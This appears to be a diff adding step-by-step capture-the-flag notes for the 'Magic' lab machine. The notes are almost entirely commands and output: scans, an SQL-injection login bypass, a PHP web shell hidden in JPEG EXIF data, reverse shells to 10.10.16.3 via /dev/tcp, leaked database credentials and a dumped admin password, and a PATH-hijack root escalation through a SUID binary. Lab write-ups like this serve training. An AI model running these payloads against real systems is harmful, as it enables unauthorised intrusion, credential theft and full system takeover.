@@ -1,0 +1,202 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.185
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.185
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Magic Portfolio
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+
+access: http://10.10.10.185/
+access: http://10.10.10.185/login.php
+
+intercept then put this payload: 
+payload: username=' or 1=1-- -&password=
+username='%20or%201%3d1--%20-&password=
+
+command: gobuster dir -u http://10.10.10.185/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php 
+result:
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.185/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2023/06/16 01:15:16 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 4214]
+/.php                 (Status: 403) [Size: 277]
+/images               (Status: 301) [Size: 313] [--> http://10.10.10.185/images/]
+/login.php            (Status: 200) [Size: 4221]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.10.185/assets/]
+/upload.php           (Status: 302) [Size: 2957] [--> login.php]
+/logout.php           (Status: 302) [Size: 0] [--> index.php]
+
+let's download jpg file
+command: exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.jpg
+command: cp exploit.jpg exploit.php.jpg
+
+upload exploit.php.jpg
+access: http://10.10.10.185/images/uploads/exploit.php.jpg?cmd=id
+command: nc -lvnp 7979
+access: http://10.10.10.185/images/uploads/exploit.php.jpg?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.3/7979 0>%261'
+
+command: cd /var/www/Magic
+command: cat db.php5
+cat db.php5
+<?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+
+    private static $cont  = null;
+
+    public function __construct() {
+        die('Init function is not allowed');
+    }
+
+    public static function connect()
+    {
+        // One connection through whole application
+        if ( null == self::$cont )
+        {
+            try
+            {
+                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
+            }
+            catch(PDOException $e)
+            {
+                die($e->getMessage());
+            }
+        }
+        return self::$cont;
+    }
+
+    public static function disconnect()
+    {
+        self::$cont = null;
+    }
+}
+
+command: mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
+<us --password=iamkingtheseus --host=localhost Magic
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
+--
+-- Host: localhost    Database: Magic
+-- ------------------------------------------------------
+-- Server version       5.7.29-0ubuntu0.18.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Table structure for table `login`
+--
+
+DROP TABLE IF EXISTS `login`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `login` (
+  `id` int(6) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `login`
+--
+
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2023-06-15 11:30:01
+
+command: su - theseus
+password: Th3s3usW4sK1ng
+
+command: cat user.txt
+efd42dce10b9f231a255c2d742b0916e
+
+command: find / -user root -type f -perm -4000 -ls 2>/dev/null
+take attention:
+   393232     24 -rwsr-x---   1 root     users              22040 Oct 21  2019 /bin/sysinfo
+
+command: cat /etc/group | grep users
+users:x:100:theseus
+
+command: ltrace sysinfo
+result:
+) = 0x55642e003020
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffc59e07c10, 0x55642de01972, 0, 2880) = 0x7ffc59e07c20
+popen("fdisk -l", "r")                           = 0x55642f868280
+fgets(fdisk: cannot open /dev/loop0: Permission denied
+fdisk: cannot open /dev/loop1: Permission denied
+fdisk: cannot open /dev/loop2: Permission denied
+
+take attention popen.
+command: cd /dev/shm
+command: echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/7979 0>&1' > fdisk
+command: chmod +x fdisk
+command: ./fdisk
+
+command: echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+command: export PATH="/dev/shm:$PATH"
+command: echo $PATH
+result:
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+command: nc -lvnp 7979
+command: sysinfo
+
+command: cat root.txt
+4e70ece004239f4f62b446ff50926fa1
+
+resource:
+https://0xdf.gitlab.io/2020/08/22/htb-magic.html#shell-as-www-data
+https://offs3cg33k.medium.com/magic-htb-walkthrough-129e6a5c3c89
